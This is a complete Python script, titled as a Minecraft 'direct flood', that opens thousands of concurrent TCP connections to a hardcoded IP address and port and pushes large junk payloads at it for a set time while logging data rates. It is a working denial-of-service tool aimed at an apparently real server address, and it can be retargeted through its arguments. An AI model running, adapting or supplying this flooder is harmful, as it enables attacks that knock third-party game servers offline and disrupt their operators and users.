"""
Minecraft Direct Flood - Self-logging
"""
import socket, time, sys, asyncio, os

TARGET_IP = "5.133.100.33"
TARGET_PORT = 25600
TASK_COUNT = 4000
TEST_DURATION = 60
PAYLOAD_SIZE = 65500
PAYLOAD = b'x' * PAYLOAD_SIZE

bytes_sent = connections = errors = 0
lock = asyncio.Lock()
log_file = None

async def flood_task(stop):
    global bytes_sent, connections, errors
    loop = asyncio.get_running_loop()
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(5.0)
            s.setblocking(False)
            await asyncio.wait_for(loop.sock_connect(s, (TARGET_IP, TARGET_PORT)), timeout=3.0)
            async with lock:
                connections += 1
            while not stop.is_set():
                try:
                    await asyncio.wait_for(loop.sock_sendall(s, PAYLOAD), timeout=2.0)
                    async with lock:
                        bytes_sent += len(PAYLOAD)
                except:
                    break
        except:
            async with lock:
                errors += 1
        finally:
            try: s.close()
            except: pass

async def monitor(stop, start, tasks):
    while not stop.is_set():
        await asyncio.sleep(1)
        elapsed = time.time() - start
        if elapsed >= TEST_DURATION:
            stop.set(); break
        async with lock:
            b = bytes_sent; c = connections; e = errors
        mbps = (b/max(elapsed,0.1))*8/1_000_000
        er = e/max(c+e,1)*100
        alive = sum(1 for t in tasks if not t.done())
        line = f"[T{elapsed:.0f}s] {TARGET_IP}:{TARGET_PORT} DATA:{b/1_000_000:.1f}MB RATE:{mbps:.0f}Mbps CONN:{c} ERR:{e}({er:.1f}%) TASKS:{alive}"
        print(line, flush=True)
        if log_file:
            with open(log_file, "a") as lf:
                lf.write(line + "\n")
                lf.flush()

async def main_async():
    global TASK_COUNT, TEST_DURATION, TARGET_IP, TARGET_PORT, log_file

    if len(sys.argv) >= 3:
        TARGET_IP = sys.argv[1]; TARGET_PORT = int(sys.argv[2])
    if len(sys.argv) >= 4:
        TASK_COUNT = int(sys.argv[3])
    if len(sys.argv) >= 5:
        TEST_DURATION = int(sys.argv[4])
    if len(sys.argv) >= 6:
        log_file = sys.argv[5]

    print(f"[FLOOD] {TASK_COUNT}tasks x{PAYLOAD_SIZE}B -> {TARGET_IP}:{TARGET_PORT} {TEST_DURATION}s", flush=True)
    try:
        s = socket.socket(); s.settimeout(3)
        s.connect((TARGET_IP, TARGET_PORT)); s.close()
        print("[OK] Connected\n", flush=True)
    except Exception as e:
        print(f"[FAIL] {e}", flush=True); return

    stop = asyncio.Event()
    tasks = [asyncio.create_task(flood_task(stop)) for _ in range(TASK_COUNT)]
    start = time.time()
    mon = asyncio.create_task(monitor(stop, start, tasks))
    await asyncio.gather(*tasks, return_exceptions=True)
    await mon

    elapsed = time.time()-start
    async with lock:
        b=bytes_sent; c=connections; e=errors
    mbps = (b/max(elapsed,0.1))*8/1_000_000
    er = e/max(c+e,1)*100
    line = f"\n[DATA] {TARGET_IP}:{TARGET_PORT} {b/1_000_000:.1f}MB | {mbps:.0f}Mbps | CONN:{c} | ERR:{e}({er:.1f}%)"
    print(line)
    if log_file:
        with open(log_file, "a") as lf:
            lf.write(line + "\n")

if __name__ == "__main__":
    try: asyncio.run(main_async())
    except KeyboardInterrupt: print("\n[STOP]")
    except Exception as ex: print(f"\n[ERR] {ex}")
